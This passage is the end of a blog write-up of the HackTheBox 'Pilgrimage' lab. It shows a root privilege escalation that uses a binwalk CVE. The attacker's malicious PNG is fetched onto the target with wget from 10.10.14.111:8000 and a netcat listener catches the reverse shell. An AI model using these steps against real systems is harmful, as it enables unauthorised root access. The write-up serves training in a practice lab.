</span></span><span class=line><span class=cl><span class=nx>You</span> <span class=nx>can</span> <span class=nx>now</span> <span class=nx>rename</span> <span class=nx>and</span> <span class=nx>share</span> <span class=nx>binwalk_exploit</span> <span class=nx>and</span> <span class=nx>start</span> <span class=nx>your</span> <span class=nx>local</span> <span class=nx>netcat</span> <span class=nx>listener</span><span class=p>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/pilgrimage/notes/priv]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$ll</span>
</span></span><span class=line><span class=cl><span class=nx>total</span> <span class=mf>8.0</span><span class=nx>K</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>r</span><span class=o>--</span><span class=nx>r</span><span class=o>--</span> <span class=mi>1</span> <span class=nx>noob</span> <span class=nx>noob</span> <span class=mf>2.8</span><span class=nx>K</span> <span class=nx>Nov</span> <span class=mi>22</span> <span class=mi>18</span><span class=o>:</span><span class=mi>12</span> <span class=nx>bin</span><span class=o>-</span><span class=nx>cve</span><span class=p>.</span><span class=nx>py</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>r</span><span class=o>--</span><span class=nx>r</span><span class=o>--</span> <span class=mi>1</span> <span class=nx>noob</span> <span class=nx>noob</span>  <span class=mi>682</span> <span class=nx>Nov</span> <span class=mi>22</span> <span class=mi>18</span><span class=o>:</span><span class=mi>14</span> <span class=nx>binwalk_exploit</span><span class=p>.</span><span class=nx>png</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>r</span><span class=o>--</span><span class=nx>r</span><span class=o>--</span> <span class=mi>1</span> <span class=nx>noob</span> <span class=nx>noob</span>    <span class=mi>0</span> <span class=nx>Nov</span> <span class=mi>22</span> <span class=mi>18</span><span class=o>:</span><span class=mi>14</span> <span class=nx>exploit</span>
</span></span></code></pre></div><p>For some reason the exploit would not work when using the web portal to upload the payload, possible reason could be that ImageMagick was modifying the payload. But when we directly put the file into the target directory we got reverse shell as root.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>emily</span><span class=err>@</span><span class=nx>pilgrimage</span><span class=o>:</span><span class=err>/var/www/pilgrimage.htb/shrunk$ wget 10.10.14.111:8000/binwalk_exploit.png</span>
</span></span><span class=line><span class=cl><span class=o>--</span><span class=mi>2023</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>23</span> <span class=mi>04</span><span class=o>:</span><span class=mi>46</span><span class=o>:</span><span class=mi>17</span><span class=o>--</span>  <span class=nx>http</span><span class=o>:</span><span class=c1>//10.10.14.111:8000/binwalk_exploit.png
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>Connecting</span> <span class=nx>to</span> <span class=mf>10.10.14.111</span><span class=o>:</span><span class=mf>8000.</span><span class=p>..</span> <span class=nx>connected</span><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=nx>HTTP</span> <span class=nx>request</span> <span class=nx>sent</span><span class=p>,</span> <span class=nx>awaiting</span> <span class=nx>response</span><span class=p>...</span> <span class=mi>200</span> <span class=nx>OK</span>
</span></span><span class=line><span class=cl><span class=nx>Length</span><span class=o>:</span> <span class=mi>682</span> <span class=p>[</span><span class=nx>image</span><span class=o>/</span><span class=nx>png</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>Saving</span> <span class=nx>to</span><span class=o>:</span> <span class=s1>&#39;binwalk_exploit.png&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>binwalk_exploit</span><span class=p>.</span><span class=nx>png</span>      <span class=mi>100</span><span class=o>%</span><span class=p>[</span><span class=o>=================================&gt;</span><span class=p>]</span>     <span class=mi>682</span>  <span class=o>--</span><span class=p>.</span><span class=o>-</span><span class=nx>KB</span><span class=o>/</span><span class=nx>s</span>    <span class=k>in</span> <span class=mi>0</span><span class=nx>s</span>      
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=mi>2023</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>23</span> <span class=mi>04</span><span class=o>:</span><span class=mi>46</span><span class=o>:</span><span class=mi>17</span> <span class=p>(</span><span class=mi>101</span> <span class=nx>MB</span><span class=o>/</span><span class=nx>s</span><span class=p>)</span> <span class=o>-</span> <span class=s1>&#39;binwalk_exploit.png&#39;</span> <span class=nx>saved</span> <span class=p>[</span><span class=mi>682</span><span class=o>/</span><span class=mi>682</span><span class=p>]</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/posts/pilgrimage/Pilgrimage%20e11ff2958bc6407d8931fe77ab0a568f/Untitled%204.png></p><h2 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h2><p><a href=https://www.exploit-db.com/exploits/51261>ImageMagick Exploit</a></p><p><a href=https://www.exploit-db.com/exploits/51249>Binwalk exploit</a></p><p><a href=https://github.com/voidz0r/CVE-2022-44268>https://github.com/voidz0r/CVE-2022-44268</a></p></div><footer class=post-footer><ul class=post-tags><li><a href=//localhost:1313/tags/linux/>Linux</a></li><li><a href=//localhost:1313/tags/easy/>Easy</a></li><li><a href=//localhost:1313/tags/hackthebox/>Hackthebox</a></li><li><a href=//localhost:1313/tags/web/>Web</a></li></ul><nav class=paginav><a class=next href=//localhost:1313/posts/monitorstwo/><span class=title>Next »</span><br><span>Abusing Cacti: From SQLi to Root on MonitorsTwo</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share A Pilgrim's Progress: Exploiting ImageMagick and Binwalk on Pilgrimage on x" href="https://x.com/intent/tweet/?text=A%20Pilgrim%27s%20Progress%3a%20Exploiting%20ImageMagick%20and%20Binwalk%20on%20Pilgrimage&amp;url=%2f%2flocalhost%3a1313%2fposts%2fpilgrimage%2f&amp;hashtags=linux%2ceasy%2chackthebox%2cweb"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share A Pilgrim's Progress: Exploiting ImageMagick and Binwalk on Pilgrimage on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2f%2flocalhost%3a1313%2fposts%2fpilgrimage%2f&amp;title=A%20Pilgrim%27s%20Progress%3a%20Exploiting%20ImageMagick%20and%20Binwalk%20on%20Pilgrimage&amp;summary=A%20Pilgrim%27s%20Progress%3a%20Exploiting%20ImageMagick%20and%20Binwalk%20on%20Pilgrimage&amp;source=%2f%2flocalhost%3a1313%2fposts%2fpilgrimage%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share A Pilgrim's Progress: Exploiting ImageMagick and Binwalk on Pilgrimage on reddit" href="https://reddit.com/submit?url=%2f%2flocalhost%3a1313%2fposts%2fpilgrimage%2f&title=A%20Pilgrim%27s%20Progress%3a%20Exploiting%20ImageMagick%20and%20Binwalk%20on%20Pilgrimage"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share A Pilgrim's Progress: Exploiting ImageMagick and Binwalk on Pilgrimage on facebook" href="https://facebook.com/sharer/sharer.php?u=%2f%2flocalhost%3a1313%2fposts%2fpilgrimage%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share A Pilgrim's Progress: Exploiting ImageMagick and Binwalk on Pilgrimage on whatsapp" href="https://api.whatsapp.com/send?text=A%20Pilgrim%27s%20Progress%3a%20Exploiting%20ImageMagick%20and%20Binwalk%20on%20Pilgrimage%20-%20%2f%2flocalhost%3a1313%2fposts%2fpilgrimage%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share A Pilgrim's Progress: Exploiting ImageMagick and Binwalk on Pilgrimage on telegram" href="https://telegram.me/share/url?text=A%20Pilgrim%27s%20Progress%3a%20Exploiting%20ImageMagick%20and%20Binwalk%20on%20Pilgrimage&amp;url=%2f%2flocalhost%3a1313%2fposts%2fpilgrimage%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share A Pilgrim's Progress: Exploiting ImageMagick and Binwalk on Pilgrimage on ycombinator" href="https://news.ycombinator.com/submitlink?t=A%20Pilgrim%27s%20Progress%3a%20Exploiting%20ImageMagick%20and%20Binwalk%20on%20Pilgrimage&u=%2f%2flocalhost%3a1313%2fposts%2fpilgrimage%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=//localhost:1313/>Fieryrival's Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script></body></html>